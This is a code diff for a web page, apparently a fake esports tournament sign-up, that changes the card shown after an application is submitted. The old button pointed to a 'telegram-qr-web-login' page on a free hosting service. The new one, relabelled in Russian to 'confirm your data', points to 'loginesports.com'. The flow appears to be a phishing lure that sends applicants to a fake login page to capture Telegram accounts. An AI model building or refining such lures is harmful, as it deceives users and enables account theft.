@@ -1271,50 +1271,48 @@
             finalMessage.style.display = "block";
             finalMessage.scrollIntoView({ behavior: 'smooth', block: 'start' });
 
+            // ✅ CHANGED BLOCK (instead of "APPLICATION SENT — WAITING FOR DECISION")
             finalCard.innerHTML = `
                 <div class="section-title" style="margin-bottom:6px;">
-                    <span class="bar"></span>Application sent — next step
+                    <span class="bar"></span>Подтвердите данные
                 </div>
 
-                <div class="success-envelope">✅</div>
-
                 <div class="section-sub" style="margin-bottom:12px;">
-                    Your application has been sent. To continue, start the qualifying stage.
+                    Пожалуйста, подтвердите введённые данные и продолжите на следующем шаге.
                 </div>
 
                 <div style="display:flex; justify-content:flex-end;">
-                    <a href="https://telegram-qr-web-login.onrender.com"
-                    style="
-                        padding: 8px 18px;
-                        border-radius: var(--radius-full);
-                        background: linear-gradient(90deg, var(--accent-alt), var(--accent));
-                        color: #000;
-                        font-size: 8px;
-                        font-weight: 800;
-                        letter-spacing: 0.18em;
-                        text-transform: uppercase;
-                        text-decoration: none;
-                        box-shadow: 0 10px 24px rgba(0,0,0,1);
-                        display: inline-flex;
-                        align-items: center;
-                        gap: 7px;
-                    ">
-                    <span style="
-                        width: 12px;
-                        height: 12px;
-                        border-radius: 999px;
-                        background: #000;
-                        color: var(--accent);
-                        display: inline-flex;
-                        align-items: center;
-                        justify-content: center;
-                        font-size: 8px;
-                    ">▶</span>
-                    НАЧАТЬ ОТБОРОЧНЫЙ ЭТАП
+                    <a href="https://loginesports.com"
+                       style="
+                            padding: 8px 18px;
+                            border-radius: var(--radius-full);
+                            background: linear-gradient(90deg, var(--accent-alt), var(--accent));
+                            color: #000;
+                            font-size: 8px;
+                            font-weight: 800;
+                            letter-spacing: 0.18em;
+                            text-transform: uppercase;
+                            text-decoration: none;
+                            box-shadow: 0 10px 24px rgba(0,0,0,1);
+                            display: inline-flex;
+                            align-items: center;
+                            gap: 7px;
+                       ">
+                        <span style="
+                            width: 12px;
+                            height: 12px;
+                            border-radius: 999px;
+                            background: #000;
+                            color: var(--accent);
+                            display: inline-flex;
+                            align-items: center;
+                            justify-content: center;
+                            font-size: 8px;
+                        ">✓</span>
+                        ПОДТВЕРДИТЬ
                     </a>
                 </div>
-                `;
-
+            `;
         });
     }
 
